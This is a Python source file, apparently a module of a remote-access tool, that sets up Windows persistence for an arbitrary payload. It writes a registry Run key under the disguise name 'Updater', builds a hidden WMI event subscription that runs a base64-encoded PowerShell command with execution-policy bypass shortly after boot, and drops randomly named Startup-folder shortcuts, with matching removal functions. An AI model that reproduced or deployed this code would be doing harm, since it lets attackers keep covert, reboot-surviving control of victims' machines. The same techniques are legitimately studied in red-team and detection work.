# -*- coding: utf-8 -*-
# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------

from _winreg import (
    OpenKey, HKEY_CURRENT_USER, KEY_WRITE, SetValueEx, REG_SZ,
    CloseKey, KEY_ALL_ACCESS, DeleteValue
)

import random
import string
import subprocess
import _subprocess as sub
from base64 import b64encode
import os

# ---------------- Persistence using registry ----------------

def add_registry_startup(cmd, name='Updater'):
    aKey = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE)
    try:
        SetValueEx(aKey, name, 0, REG_SZ, cmd)
        return True

    except:
        return False

    finally:
        CloseKey(aKey)


def remove_registry_startup(name='Updater'):
    try:
        key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
        DeleteValue(key, name)
        return True

    except:
        return False

    finally:
        CloseKey(key)

# ---------------- Persistence using WMI event ----------------

def main_powershell_code(startup, cmd_line, name):
    return '''
$filter = ([wmiclass]"\\\\.\\root\\subscription:__EventFilter").CreateInstance()
$filter.QueryLanguage = "WQL"
$filter.Query = "Select * from __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA [STARTUP]"
$filter.Name = "[NAME]"
$filter.EventNamespace = 'root\\cimv2'

$result = $filter.Put()
$filterPath = $result.Path

$consumer = ([wmiclass]"\\\\.\\root\\subscription:CommandLineEventConsumer").CreateInstance()
$consumer.Name = '[NAME]'
$consumer.CommandLineTemplate = '[COMMAND_LINE]'
$consumer.ExecutablePath = ""
$consumer.WorkingDirectory = "C:\\Windows\\System32"
$result = $consumer.Put()
$consumerPath = $result.Path

$bind = ([wmiclass]"\\\\.\\root\\subscription:__FilterToConsumerBinding").CreateInstance()

$bind.Filter = $filterPath
$bind.Consumer = $consumerPath
$result = $bind.Put()
$bindPath = $result.Path
'''.replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', name)


def execute_powershell(cmdline):
    info = subprocess.STARTUPINFO()
    info.dwFlags = sub.STARTF_USESHOWWINDOW
    info.wShowWindow = sub.SW_HIDE

    command=['powershell.exe', '/c', cmdline]
    p = subprocess.Popen(command, startupinfo=info, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, universal_newlines=True)
    results, _ = p.communicate()
    return results

def check_if_persistence_created(name):
    code = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='%s'\"" % name
    result = execute_powershell(code)
    if name in result:
        return True
    else:
        return False

def wmi_persistence(command=None, file=None, name='Updater'):
    cmd = command
    cmd_line = None

    if not name:
        name = 'Updater'

    if file:
        if not os.path.exists(file):
            return False, 'file not found: %s' % file

        # cmd_line = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -C "cat %s | Out-String | iex"' % file
        cmd_line = file
    else:
        cmd_line = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded %s' % b64encode(cmd.encode('UTF-16LE'))

    # the payload will be launched 4 minutes after the system reboot
    startup = "'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"

    powershell = main_powershell_code(startup, cmd_line, name)
    execute_powershell(powershell)

    if check_if_persistence_created(name):
        return True
    else:
        return False

def remove_wmi_persistence(name='Updater'):
    code ='''
Get-WmiObject __eventFilter -namespace root\subscription -filter "name='[NAME]'"| Remove-WmiObject
Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='[NAME]'" | Remove-WmiObject
Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match '[NAME]'} | Remove-WmiObject
'''.replace('[NAME]', name)

    result = execute_powershell(code)
    if not result:
        return True
    else:
        return False

# ---------------- Persistence using startup files ----------------

def startup_file_persistence(cmd):
    appdata    = os.path.expandvars("%AppData%")
    startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
    if os.path.exists(startup_dir):
        random_name = ''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])
        persistence_file = os.path.join(startup_dir, '%s.eu.url' % random_name)

        content = '\n[InternetShortcut]\nURL=file:///%s\n' % cmd

        f = open(persistence_file, 'w')
        f.write(content)
        f.close()

        return True
    else:
        return False

def remove_startup_file_persistence():
    appdata    = os.path.expandvars("%AppData%")
    startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
    found = False
    if os.path.exists(startup_dir):
        for f in os.listdir(startup_dir):
            file = os.path.join(startup_dir, f)
            if file.endswith('.eu.url'):
                os.remove(file)
                found = True

    return found
